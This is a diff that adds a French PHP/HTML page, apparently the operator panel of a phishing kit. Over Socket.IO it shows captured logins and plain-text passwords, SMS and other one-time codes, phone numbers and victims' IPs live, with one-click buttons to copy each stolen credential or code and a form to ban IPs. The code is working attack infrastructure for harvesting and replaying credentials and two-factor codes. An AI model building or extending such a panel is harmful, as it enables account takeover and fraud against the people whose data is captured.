@@ -1,0 +1,361 @@
+<?php
+include("common/includes.php");
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Logs de Connexion</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+        }
+        th {
+            background-color: #f4f4f4;
+            text-align: left;
+        }
+        tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+        tr:hover {
+            background-color: #f1f1f1;
+        }
+        .container {
+            width: 80%;
+            margin: 0 auto;
+            margin-top: 50px;
+        }
+        .delete-btn, .copy-btn {
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+            margin-right: 5px;
+            border-radius: 3px;
+        }
+        .delete-btn {
+            background-color: red;
+        }
+        .copy-btn {
+            background-color: green;
+        }
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            z-index: 1000;
+        }
+        /* Style pour le formulaire de bannissement */
+        .ban-form {
+            margin-top: 30px;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+        .ban-form h2 {
+            margin-top: 0;
+        }
+        .ban-form input[type="text"] {
+            width: 300px;
+            padding: 8px;
+            margin-right: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+        .ban-form button {
+            padding: 8px 15px;
+            border: none;
+            background-color: red;
+            color: white;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .ban-form button:hover {
+            background-color: darkred;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Logs de Connexion</h1>
+        <table id="logs-table">
+            <thead>
+                <tr>
+                    <th>Type</th>
+                    <th>Détails</th>
+                    <th>IP</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody>
+                <!-- Les lignes seront ajoutées par JavaScript -->
+            </tbody>
+        </table>
+
+        <!-- Formulaire pour bannir une IP -->
+        <div class="ban-form">
+            <h2>Bannir une Adresse IP</h2>
+            <form id="ban-ip-form">
+                <input type="text" id="ban-ip-input" placeholder="Entrez l'adresse IP à bannir" required>
+                <button type="submit">Bannir</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">Texte copié avec succès</div>
+
+    <!-- Inclure la bibliothèque Socket.IO -->
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+
+        // Fonction pour afficher une notification temporaire
+        function showNotification(message, color = '#4CAF50') {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.backgroundColor = color;
+            notification.style.display = 'block';
+            notification.style.opacity = '1';
+
+            // Masquer la notification après 0.5 seconde
+            setTimeout(() => {
+                notification.style.opacity = '0';
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 300); // Laisser le temps à la transition de finir
+            }, 500);
+        }
+
+        // Fonction pour capitaliser la première lettre
+        function capitalizeFirstLetter(string) {
+            return string.charAt(0).toUpperCase() + string.slice(1);
+        }
+
+        // Fonction pour copier du texte dans le presse-papiers
+        function copyToClipboard(text) {
+            if (!text) return; // Si aucun texte à copier, ne rien faire
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+
+            // Afficher la notification
+            showNotification('Texte copié avec succès');
+        }
+
+        // Charger initialement les logs
+        fetch('/logs')
+            .then(response => response.json())
+            .then(data => {
+                const tableBody = document.querySelector("#logs-table tbody");
+                data.forEach((log, index) => {
+                    addLogToTable(log, index, tableBody);
+                });
+            })
+            .catch(err => {
+                console.error('Erreur lors du chargement des logs :', err);
+                showNotification('Erreur lors du chargement des logs', 'red');
+            });
+
+        // Fonction pour ajouter un log au tableau
+        function addLogToTable(log, index, tableBody) {
+            const row = document.createElement("tr");
+
+            let details = '';
+            let actions = [];
+
+            if (log.type === 'login') {
+                details = `Login: ${log.login}, Password: ${log.password}`;
+                // Créer bouton Copier Login
+                const copyLoginBtn = document.createElement('button');
+                copyLoginBtn.classList.add('copy-btn');
+                copyLoginBtn.textContent = 'Copier Login';
+                copyLoginBtn.dataset.copy = log.login;
+                actions.push(copyLoginBtn);
+
+                // Créer bouton Copier Mot de Passe
+                const copyPasswordBtn = document.createElement('button');
+                copyPasswordBtn.classList.add('copy-btn');
+                copyPasswordBtn.textContent = 'Copier Mot de Passe';
+                copyPasswordBtn.dataset.copy = log.password;
+                actions.push(copyPasswordBtn);
+            } else if (log.type === 'code_sms') {
+                details = `Code SMS: ${log.code}`;
+                // Créer bouton Copier Code SMS
+                const copyCodeSmsBtn = document.createElement('button');
+                copyCodeSmsBtn.classList.add('copy-btn');
+                copyCodeSmsBtn.textContent = 'Copier Code SMS';
+                copyCodeSmsBtn.dataset.copy = log.code;
+                actions.push(copyCodeSmsBtn);
+            } else if (log.type === 'code') {
+                details = `Code: ${log.code}`;
+                // Créer bouton Copier Code
+                const copyCodeBtn = document.createElement('button');
+                copyCodeBtn.classList.add('copy-btn');
+                copyCodeBtn.textContent = 'Copier Code';
+                copyCodeBtn.dataset.copy = log.code;
+                actions.push(copyCodeBtn);
+            } else if (log.type === 'phone') {
+                details = `Pays: ${log.country}, Téléphone: ${log.phone}`;
+                // Créer bouton Copier Téléphone
+                const copyPhoneBtn = document.createElement('button');
+                copyPhoneBtn.classList.add('copy-btn');
+                copyPhoneBtn.textContent = 'Copier Téléphone';
+                copyPhoneBtn.dataset.copy = log.phone;
+                actions.push(copyPhoneBtn);
+            } else {
+                details = `Données Inconnues`;
+                // Optionnel : ajouter un bouton Copier vide ou autre
+                const copyUnknownBtn = document.createElement('button');
+                copyUnknownBtn.classList.add('copy-btn');
+                copyUnknownBtn.textContent = 'Copier';
+                copyUnknownBtn.disabled = true;
+                actions.push(copyUnknownBtn);
+            }
+
+            // Créer bouton Supprimer
+            const deleteBtn = document.createElement('button');
+            deleteBtn.classList.add('delete-btn');
+            deleteBtn.textContent = 'Supprimer';
+            deleteBtn.dataset.index = index;
+            actions.push(deleteBtn);
+
+            // Créer cellule Actions
+            const actionsCell = document.createElement('td');
+            actions.forEach(btn => actionsCell.appendChild(btn));
+
+            // Remplir les cellules
+            const typeCell = document.createElement('td');
+            typeCell.textContent = log.type === 'code_sms' ? 'Code SMS' : capitalizeFirstLetter(log.type);
+
+            const detailsCell = document.createElement('td');
+            detailsCell.textContent = details;
+
+            const ipCell = document.createElement('td');
+            ipCell.textContent = log.ip;
+
+            // Ajouter les cellules à la ligne
+            row.appendChild(typeCell);
+            row.appendChild(detailsCell);
+            row.appendChild(ipCell);
+            row.appendChild(actionsCell);
+
+            // Ajouter la ligne au tableau
+            tableBody.appendChild(row);
+        }
+
+        // Écouter les événements Socket.IO pour les mises à jour en temps réel
+        socket.on('update', (data) => {
+            const tableBody = document.querySelector("#logs-table tbody");
+            if (data.action === 'add') {
+                const newLog = data.logData;
+                const index = tableBody.children.length; // Ajouter à la fin
+                addLogToTable(newLog, index, tableBody);
+            } else if (data.action === 'delete') {
+                const { index } = data.logData;
+                const row = tableBody.children[index];
+                if (row) {
+                    row.remove();
+                    // Re-indexer les boutons Supprimer
+                    Array.from(tableBody.children).forEach((tr, i) => {
+                        const deleteBtn = tr.querySelector('.delete-btn');
+                        if (deleteBtn) {
+                            deleteBtn.dataset.index = i;
+                        }
+                    });
+                }
+            }
+        });
+
+        // Écouter les événements de bannissement d'IP
+        socket.on('ban-ip', (data) => {
+            showNotification(`IP ${data.ip} a été bannie.`, 'red');
+            // Optionnel : actualiser la page ou mettre à jour l'interface utilisateur
+        });
+
+        // Gérer le formulaire de bannissement d'IP
+        const banIpForm = document.getElementById('ban-ip-form');
+        banIpForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const ipInput = document.getElementById('ban-ip-input');
+            const ip = ipInput.value.trim();
+
+            if (!ip) {
+                showNotification('Veuillez entrer une adresse IP valide.', 'red');
+                return;
+            }
+
+            // Envoyer la requête POST pour bannir l'IP
+            fetch('/ban-ip', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ ip }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showNotification(data.message, '#4CAF50');
+                    ipInput.value = ''; // Réinitialiser le champ
+                } else {
+                    showNotification(data.error || 'Erreur lors du bannissement de l\'IP.', 'red');
+                }
+            })
+            .catch(err => {
+                console.error('Erreur lors du bannissement de l\'IP :', err);
+                showNotification('Erreur lors du bannissement de l\'IP.', 'red');
+            });
+        });
+
+        // Gérer les clics sur les boutons "Supprimer" et "Copier" en utilisant l'événement de délégation
+        document.querySelector('#logs-table tbody').addEventListener('click', function(event) {
+            const target = event.target;
+
+            if (target.classList.contains('delete-btn')) {
+                const index = target.dataset.index;
+                if (index === undefined) return;
+
+                // Envoyer la requête DELETE pour supprimer le log
+                fetch(`/delete-log/${index}`, { method: 'DELETE' })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            // Suppression gérée via Socket.IO
+                            showNotification('Log supprimé avec succès.', '#4CAF50');
+                        } else {
+                            showNotification(data.error || 'Erreur lors de la suppression du log.', 'red');
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Erreur lors de la suppression du log :', err);
+                        showNotification('Erreur lors de la suppression du log.', 'red');
+                    });
+            } else if (target.classList.contains('copy-btn')) {
+                const textToCopy = target.dataset.copy;
+                copyToClipboard(textToCopy);
+            }
+        });
+    </script>
+</body>
+</html>
